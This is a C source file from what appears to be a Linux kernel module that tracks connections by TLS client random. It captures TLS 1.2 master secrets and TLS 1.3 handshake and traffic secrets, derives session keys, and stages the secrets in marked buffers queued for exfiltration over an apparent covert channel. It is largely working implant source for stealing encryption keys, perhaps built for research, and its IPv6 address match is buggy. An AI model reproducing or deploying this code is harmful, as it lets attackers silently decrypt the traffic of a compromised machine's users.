#include "connection_list.h"

#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/ipv6.h>
#include <net/ip.h>

#include "../common.h"
#include "tls_crypto.h"

DEFINE_SPINLOCK(conn_list_mod_slock);
LIST_HEAD(conn_list);

void cckex_conn_list_reset(void) {

	cckex_conn_list_entry_t *entry;
	cckex_conn_list_entry_t *n;

	spin_lock_bh(&conn_list_mod_slock);

	list_for_each_entry_safe(entry, n, &conn_list, list) {

		if(entry->ip.remote_ip_raw != NULL) kfree(entry->ip.remote_ip_raw);
		
		if(entry->key_block != NULL) {
			kfree(entry->key_block);
		} else {
			if(entry->client_write_key != NULL) kfree(entry->client_write_key);
			if(entry->client_write_iv != NULL) kfree(entry->client_write_iv);
		}

		if(entry->client_random != NULL) kfree(entry->client_random);
		if(entry->server_random != NULL) kfree(entry->server_random);

		if(entry->master_secret != NULL) kfree(entry->master_secret);
		if(entry->handshake_secret != NULL) kfree(entry->handshake_secret);
		if(entry->server_traffic_secret != NULL) kfree(entry->server_traffic_secret);
		if(entry->server_handshake_secret != NULL) kfree(entry->server_handshake_secret);

		list_del(&entry->list);

		kfree(entry);
	}

	spin_unlock_bh(&conn_list_mod_slock);
}

void cckex_conn_list_add(cckex_conn_list_entry_t *entry) {
	//mutex_lock(&conn_list_mod_lock);
	spin_lock_bh(&conn_list_mod_slock);

	list_add(&entry->list, &conn_list);

	spin_unlock_bh(&conn_list_mod_slock);
	//mutex_unlock(&conn_list_mod_lock);
}

void cckex_conn_list_del(cckex_conn_list_entry_t *entry) {
	spin_lock_bh(&conn_list_mod_slock);

	list_del(&entry->list);

	spin_unlock_bh(&conn_list_mod_slock);

	kfree(entry);
}

cckex_conn_list_entry_t* cckex_conn_list_find_matching_remote_ip(void* ip, uint8_t is_ipv4) {

	cckex_conn_list_entry_t *entry;

	spin_lock_bh(&conn_list_mod_slock);

	list_for_each_entry(entry, &conn_list, list) {

		//pr_info("CCKEX_LKM [%s] is_ipv4: %i", __func__, entry->is_ipv4);

		if(is_ipv4 != entry->is_ipv4) continue;

		if(is_ipv4) {
			
			//pr_info("CCKEX_LKM [%s] checking ipv4: %pI4h == %pI4h", __func__, entry->ip.remote_ipv4, ip);

			if(*entry->ip.remote_ipv4 == *(uint32_t*)ip) {
				spin_unlock_bh(&conn_list_mod_slock);
				return entry;	
			}
		} else {
			for(size_t i = 0; i < 4; i++) {
				if(((struct in6_addr*)ip)->in6_u.u6_addr32[i] != entry->ip.remote_ipv6->in6_u.u6_addr32[i]) {
					continue;
				}
			}

			spin_unlock_bh(&conn_list_mod_slock);
			return entry;	
		}
	}

	spin_unlock_bh(&conn_list_mod_slock);

	return NULL;

}

cckex_conn_list_entry_t* cckex_conn_list_find_matching_port_pair(uint16_t local_port, uint16_t remote_port) {

	cckex_conn_list_entry_t *entry;

	spin_lock_bh(&conn_list_mod_slock);

	list_for_each_entry(entry, &conn_list, list) {
		if(entry->local_port == local_port && entry->remote_port == remote_port) {
			spin_unlock_bh(&conn_list_mod_slock);
			return entry;
		}
	}

	spin_unlock_bh(&conn_list_mod_slock);

	return NULL;
}

cckex_conn_list_entry_t* cckex_conn_list_find_matching_skb(struct sk_buff *skb, uint16_t remote_port) {
	uint16_t src_port = cckex_skb_get_source_port(skb);
	uint16_t dst_port = cckex_skb_get_dest_port(skb);

	if(src_port == remote_port) {
		return cckex_conn_list_find_matching_port_pair(dst_port, src_port);
	} else {
		return cckex_conn_list_find_matching_port_pair(src_port, dst_port);
	}
}

int cckex_conn_set_ip(cckex_conn_list_entry_t *entry, void* ip, uint8_t is_ipv4) {

	size_t size = 0;

	entry->is_ipv4 = is_ipv4;

	if(is_ipv4) {
		size = 4;
	} else {
		size = 16;
	}

	entry->ip.remote_ip_raw = kmalloc(size, GFP_KERNEL);
	if(!entry->ip.remote_ip_raw) {
		return -1;
	}

	memcpy(entry->ip.remote_ip_raw, ip, size);

	return 0;
}

int cckex_conn_set_ip_from_skb(cckex_conn_list_entry_t *entry, struct sk_buff *skb) {

	unsigned int ip = 0;

	if (cckex_skb_is_ipv4(skb)) {

		struct iphdr *iph = ip_hdr(skb);

		if(!iph) {
			pr_warn("CCKEX_LKM [%s]: failed to retrieve iphdr", __func__);
			return -1;
		}

		ip = ntohl(iph->daddr);

		return cckex_conn_set_ip(entry, &ip, 1);

	} else {
		pr_warn("CCKEX_LKM [%s]: IPV6 not supported yet", __func__);
		return -1;
	}

}

static int init_conn_list_entry(cckex_conn_list_entry_t **entry, uint8_t* client_random, size_t client_random_size) {

	*entry = kmalloc(sizeof(cckex_conn_list_entry_t), GFP_ATOMIC);
	if(!*entry) {
		pr_warn("CCKEX_LKM [%s] failed to allocate cckex_conn_list_entry_t", __func__);
		return 0;
	}

	memset(*entry, 0, sizeof(cckex_conn_list_entry_t));

	(*entry)->exfil_server_secret = 1;
	(*entry)->exfil_master_secret = 1;

	(*entry)->client_random = kmalloc(client_random_size, GFP_ATOMIC);
	if(!(*entry)->client_random) {
		pr_warn("CCKEX_LKM [%s] failed to allocate client_random.", __func__);
		return 0;
	}
	memcpy((*entry)->client_random, client_random, client_random_size);
	(*entry)->client_random_size = client_random_size;

	return 1;
}

static void try_stage_client_entry(cckex_conn_list_entry_t *entry) {

	if(entry->exfil_master_secret && entry->master_secret != NULL && entry->handshake_secret != NULL) {
		cckex_stage_master_secret_for_exfil(entry);
		entry->exfil_master_secret = 0;
	}

}

static void try_stage_server_entry(cckex_conn_list_entry_t *entry) {

	if(entry->exfil_server_secret && entry->server_traffic_secret != NULL && entry->server_handshake_secret != NULL) {
		cckex_stage_server_secret_for_exfil(entry);
		entry->exfil_server_secret = 0;
	}

}

void cckex_try_stage_secrets(void) {

	cckex_conn_list_entry_t *entry;

	pr_info("CCKEX_LKM [%s] try staging secrets ..", __func__);

	spin_lock_bh(&conn_list_mod_slock);

	list_for_each_entry(entry, &conn_list, list) {

		try_stage_server_entry(entry);
		try_stage_client_entry(entry);

	}

	spin_unlock_bh(&conn_list_mod_slock);

}

void cckex_conn_set_tls12_master_secret(uint8_t *client_random, size_t client_random_size, uint8_t *master_secret, size_t master_secret_size) {
	/*pr_info("UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU");
	//pr_info("CCKEX_LKM [%s] set master_secret (size=%i) for client_random (size=%i)", __func__, master_secret_size, client_random_size);
	//cckex_print_mem(client_random, client_random_size);
	//pr_info("CCKEX_LKM [%s] master_secret:", __func__);
	//cckex_print_mem(master_secret, master_secret_size);
	//pr_info("UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU");*/

	cckex_conn_list_entry_t *entry;

	spin_lock_bh(&conn_list_mod_slock);

	list_for_each_entry(entry, &conn_list, list) {

		//pr_info("CCKEX_LKM [%s] checking client_random:", __func__);
		//cckex_print_mem(entry->client_random, entry->client_random_size);

		if(memcmp(client_random, entry->client_random, MIN(client_random_size, entry->client_random_size)) == 0) {

			if(entry->master_secret != NULL) {
				spin_unlock_bh(&conn_list_mod_slock);
				return;
			}

			entry->master_secret = kmalloc(master_secret_size, GFP_KERNEL);
			if(!entry->master_secret) {
				pr_warn("CCKEX_LKM [%s] failed to allocate master_secret", __func__);
				spin_unlock_bh(&conn_list_mod_slock);
				return;
			}

			memcpy(entry->master_secret, master_secret, master_secret_size);
			entry->master_secret_size = master_secret_size;
			pr_info("CCKEX_LKM [%s] set secret", __func__);
			// also generate keys on the fly
	
			spin_unlock_bh(&conn_list_mod_slock);		
			cckex_tls12_prf_gen_keys(entry, "key expansion");
			return;
		}
	}

	spin_unlock_bh(&conn_list_mod_slock);
}


void cckex_conn_set_tls13_traffic_secret(uint8_t *client_random, size_t client_random_size, uint8_t *traffic_secret, size_t traffic_secret_size) {

	cckex_conn_list_entry_t *entry;

	spin_lock_bh(&conn_list_mod_slock);

	list_for_each_entry(entry, &conn_list, list) {

		//pr_info("CCKEX_LKM [%s] checking client_random:", __func__);
		//cckex_print_mem(entry->client_random, entry->client_random_size);

		if(memcmp(client_random, entry->client_random, MIN(client_random_size, entry->client_random_size)) == 0) {

			// TODO: does this make sense for TLS1.3? The key expansion is aborted if a master_secret is already set 
			// for this entry. However, due to the fact that a TLS1.3 session can have multiple traffic secrets, this
			// would not allow to overwrite old secrets -> test that
			if(entry->master_secret != NULL) {
				spin_unlock_bh(&conn_list_mod_slock);
				return;
			}

			entry->master_secret = kmalloc(traffic_secret_size, GFP_KERNEL);
			if(!entry->master_secret) {
				pr_warn("CCKEX_LKM [%s] failed to allocate master_secret", __func__);
				spin_unlock_bh(&conn_list_mod_slock);
				return;
			}
			
			memcpy(entry->master_secret, traffic_secret, traffic_secret_size);
			entry->master_secret_size = traffic_secret_size;
			pr_info("CCKEX_LKM [%s] set secret", __func__);
			// also generate keys on the fly
	
			spin_unlock_bh(&conn_list_mod_slock);		

			cckex_tls13_prf_gen_keys(entry);

			try_stage_client_entry(entry);	

			return;
		}
	}

	// no entry found add new entry
	pr_info("CCKEX_LKM [%s] no entry found -> creating new one", __func__);
	
	if(!init_conn_list_entry(&entry, client_random, client_random_size)) {
		pr_warn("CCKEX_LKM [%s] failed to init entry", __func__);
		spin_unlock_bh(&conn_list_mod_slock);
		return;
	}

	entry->master_secret = kmalloc(traffic_secret_size, GFP_KERNEL);
	if(!entry->master_secret) {
		pr_warn("CCKEX_LKM [%s] failed to allocate master_secret", __func__);
		spin_unlock_bh(&conn_list_mod_slock);
		return;
	}
			
	memcpy(entry->master_secret, traffic_secret, traffic_secret_size);
	entry->master_secret_size = traffic_secret_size;
	pr_info("CCKEX_LKM [%s] set secret", __func__);

	list_add(&entry->list, &conn_list);

	spin_unlock_bh(&conn_list_mod_slock);

	cckex_tls13_prf_gen_keys(entry);
}

void cckex_conn_set_tls13_handshake_secret(uint8_t *client_random, size_t client_random_size, uint8_t *handshake_secret, size_t handshake_secret_size) {

	cckex_conn_list_entry_t *entry;

	spin_lock_bh(&conn_list_mod_slock);

	list_for_each_entry(entry, &conn_list, list) {

		//pr_info("CCKEX_LKM [%s] checking client_random:", __func__);
		//cckex_print_mem(entry->client_random, entry->client_random_size);

		if(memcmp(client_random, entry->client_random, MIN(client_random_size, entry->client_random_size)) == 0) {

			// TODO: does this make sense for TLS1.3? The key expansion is aborted if a master_secret is already set 
			// for this entry. However, due to the fact that a TLS1.3 session can have multiple traffic secrets, this
			// would not allow to overwrite old secrets -> test that
			if(entry->handshake_secret != NULL) {
				spin_unlock_bh(&conn_list_mod_slock);
				return;
			}

			entry->handshake_secret = kmalloc(handshake_secret_size, GFP_KERNEL);
			if(!entry->handshake_secret) {
				pr_warn("CCKEX_LKM [%s] failed to allocate handshake_secret", __func__);
				spin_unlock_bh(&conn_list_mod_slock);
				return;
			}

			memcpy(entry->handshake_secret, handshake_secret, handshake_secret_size);
			entry->handshake_secret_size = handshake_secret_size;
			pr_info("CCKEX_LKM [%s] set secret", __func__);
			// also generate keys on the fly
	
			spin_unlock_bh(&conn_list_mod_slock);		

			try_stage_client_entry(entry);

			return;
		}
	}

	// no entry found add new entry
	pr_info("CCKEX_LKM [%s] no entry found -> creating new one", __func__);
	
	if(!init_conn_list_entry(&entry, client_random, client_random_size)) {
		pr_warn("CCKEX_LKM [%s] failed to init entry", __func__);
		spin_unlock_bh(&conn_list_mod_slock);
		return;
	}

	entry->handshake_secret = kmalloc(handshake_secret_size, GFP_KERNEL);
	if(!entry->handshake_secret) {
		pr_warn("CCKEX_LKM [%s] failed to allocate handshake_secret", __func__);
		spin_unlock_bh(&conn_list_mod_slock);
		return;
	}

	memcpy(entry->handshake_secret, handshake_secret, handshake_secret_size);
	entry->handshake_secret_size = handshake_secret_size;
	pr_info("CCKEX_LKM [%s] set secret", __func__);

	list_add(&entry->list, &conn_list);

	spin_unlock_bh(&conn_list_mod_slock);
}

void cckex_conn_set_server_secret(uint8_t *client_random, size_t client_random_size, uint8_t *server_secret, size_t server_secret_size) {
	
	cckex_conn_list_entry_t *entry;

	spin_lock_bh(&conn_list_mod_slock);

	list_for_each_entry(entry, &conn_list, list) {

		//pr_info("CCKEX_LKM [%s] checking client_random:", __func__);
		//cckex_print_mem(entry->client_random, entry->client_random_size);

		if(memcmp(client_random, entry->client_random, MIN(client_random_size, entry->client_random_size)) == 0) {

			// TODO: does this make sense for TLS1.3? The key expansion is aborted if a master_secret is already set 
			// for this entry. However, due to the fact that a TLS1.3 session can have multiple traffic secrets, this
			// would not allow to overwrite old secrets -> test that
			if(entry->server_traffic_secret != NULL) {
				spin_unlock_bh(&conn_list_mod_slock);
				return;
			}

			entry->server_traffic_secret = kmalloc(server_secret_size, GFP_ATOMIC);
			if(!entry->server_traffic_secret) {
				spin_unlock_bh(&conn_list_mod_slock);
				pr_warn("CCKEX_LKM [%s] failed to allocate server_traffic_secret.", __func__);
				return;
			}

			memcpy(entry->server_traffic_secret, server_secret, server_secret_size);
			entry->server_traffic_secret_size = server_secret_size;
			pr_info("CCKEX_LKM [%s] set secret", __func__);
			// also generate keys on the fly
	
			spin_unlock_bh(&conn_list_mod_slock);		

			try_stage_server_entry(entry);	

			return;
		}
	}

	pr_info("CCKEX_LKM [%s] no entry found -> creating new one", __func__);

	if(!init_conn_list_entry(&entry, client_random, client_random_size)) {
		pr_warn("CCKEX_LKM [%s] failed to init entry", __func__);
		spin_unlock_bh(&conn_list_mod_slock);
		return;
	}

	entry->server_traffic_secret = kmalloc(server_secret_size, GFP_ATOMIC);
	if(!entry->server_traffic_secret) {
		spin_unlock_bh(&conn_list_mod_slock);
		pr_warn("CCKEX_LKM [%s] failed to allocate server_traffic_secret.", __func__);
		return;
	}

	memcpy(entry->server_traffic_secret, server_secret, server_secret_size);
	entry->server_traffic_secret_size = server_secret_size;
	pr_info("CCKEX_LKM [%s] set secret", __func__);
	// also generate keys on the fly

	list_add(&entry->list, &conn_list);

	spin_unlock_bh(&conn_list_mod_slock);
}

void cckex_conn_set_server_handshake_secret(uint8_t *client_random, size_t client_random_size, uint8_t *handshake_secret, size_t handshake_secret_size) {

	cckex_conn_list_entry_t *entry;

	spin_lock_bh(&conn_list_mod_slock);

	list_for_each_entry(entry, &conn_list, list) {

		//pr_info("CCKEX_LKM [%s] checking client_random:", __func__);
		//cckex_print_mem(entry->client_random, entry->client_random_size);

		if(memcmp(client_random, entry->client_random, MIN(client_random_size, entry->client_random_size)) == 0) {

			// TODO: does this make sense for TLS1.3? The key expansion is aborted if a master_secret is already set 
			// for this entry. However, due to the fact that a TLS1.3 session can have multiple traffic secrets, this
			// would not allow to overwrite old secrets -> test that
			if(entry->server_handshake_secret != NULL) {
				spin_unlock_bh(&conn_list_mod_slock);
				return;
			}

			entry->server_handshake_secret = kmalloc(handshake_secret_size, GFP_ATOMIC);
			if(!entry->server_handshake_secret) {
				spin_unlock_bh(&conn_list_mod_slock);
				pr_warn("CCKEX_LKM [%s] failed to allocate server_handshake_secret", __func__);
				return;
			}

			memcpy(entry->server_handshake_secret, handshake_secret, handshake_secret_size);
			entry->server_handshake_secret_size = handshake_secret_size;
			pr_info("CCKEX_LKM [%s] set secret", __func__);

			spin_unlock_bh(&conn_list_mod_slock);		

			try_stage_server_entry(entry);

			return;
		}
	}

	pr_info("CCKEX_LKM [%s] no entry found -> creating new one", __func__);

	if(!init_conn_list_entry(&entry, client_random, client_random_size)) {
		pr_warn("CCKEX_LKM [%s] failed to init entry", __func__);
		spin_unlock_bh(&conn_list_mod_slock);
		return;
	}

	entry->server_handshake_secret = kmalloc(handshake_secret_size, GFP_ATOMIC);
	if(!entry->server_handshake_secret) {
		spin_unlock_bh(&conn_list_mod_slock);
		pr_warn("CCKEX_LKM [%s] failed to allocate server_handshake_secret", __func__);
		return;
	}

	memcpy(entry->server_handshake_secret, handshake_secret, handshake_secret_size);
	entry->server_handshake_secret_size = handshake_secret_size;
	pr_info("CCKEX_LKM [%s] set secret", __func__);

	list_add(&entry->list, &conn_list);

	spin_unlock_bh(&conn_list_mod_slock);

}

void cckex_stage_master_secret_for_exfil(cckex_conn_list_entry_t *entry) {

	const size_t buf_size = entry->client_random_size + entry->master_secret_size + entry->handshake_secret_size + 3; 

	cckex_key_list_entry_t *key_entry = kmalloc(sizeof(cckex_key_list_entry_t), GFP_ATOMIC);
	if(!key_entry) {
		pr_warn("CCKEX_LKM [%s] failed to allocate key_entry", __func__);
		return;
	}

	key_entry->buf = kmalloc(buf_size, GFP_ATOMIC);
	if(!key_entry->buf) {
		pr_warn("CCKEX_LKM [%s] failed to allocate key list buf", __func__);
		kfree(key_entry);
		return;
	}

	pr_info("CCKEX_LKM [%s] STAGING MASTER SECRET", __func__);

	key_entry->buf[0] = 0xff;
	key_entry->buf[1] = 0xfd;
	key_entry->buf[2] = entry->master_secret_size + entry->client_random_size + entry->handshake_secret_size;
	memcpy(key_entry->buf + 3, entry->client_random, entry->client_random_size);
	memcpy(key_entry->buf + 3 + entry->client_random_size, entry->master_secret, entry->master_secret_size);
	memcpy(key_entry->buf + 3 + entry->client_random_size + entry->master_secret_size, entry->handshake_secret, entry->handshake_secret_size);

	key_entry->size = buf_size;
	key_entry->bit_offset = 0;
	key_entry->byte_offset = 0;
	key_entry->size_to_exfiltrate = buf_size;

	cckex_print_mem(key_entry->buf, buf_size);

	cckex_enqueue_in_cc_out_list(key_entry);
}

void cckex_stage_server_secret_for_exfil(cckex_conn_list_entry_t *entry) {

	const size_t buf_size = entry->client_random_size + entry->server_traffic_secret_size + entry->server_handshake_secret_size + 3;

	cckex_key_list_entry_t *key_entry = kmalloc(sizeof(cckex_key_list_entry_t), GFP_ATOMIC);
	if(!key_entry) {
		pr_warn("CCKEX_LKM [%s] failed to allocate key_entry", __func__);
		return;
	}

	key_entry->buf = kmalloc(buf_size, GFP_ATOMIC);
	if(!key_entry->buf) {
		pr_warn("CCKEX_LKM [%s] failed to allocate key list buf", __func__);
		kfree(key_entry);
		return;
	}

	pr_info("CCKEX_LKM [%s] STAGING SERVER SECRET", __func__);

	key_entry->buf[0] = 0xff;
	key_entry->buf[1] = 0xfc;
	key_entry->buf[2] = buf_size - 3;
	memcpy(key_entry->buf + 3, entry->client_random, entry->client_random_size);
	memcpy(key_entry->buf + 3 + entry->client_random_size, entry->server_traffic_secret, entry->server_traffic_secret_size);
	memcpy(key_entry->buf + 3 + entry->client_random_size + entry->server_traffic_secret_size, entry->server_handshake_secret, entry->server_handshake_secret_size);

	key_entry->size = buf_size;
	key_entry->bit_offset = 0;
	key_entry->byte_offset = 0;
	key_entry->size_to_exfiltrate = buf_size;

	cckex_print_mem(key_entry->buf, buf_size);

	cckex_enqueue_in_cc_out_list(key_entry);
}
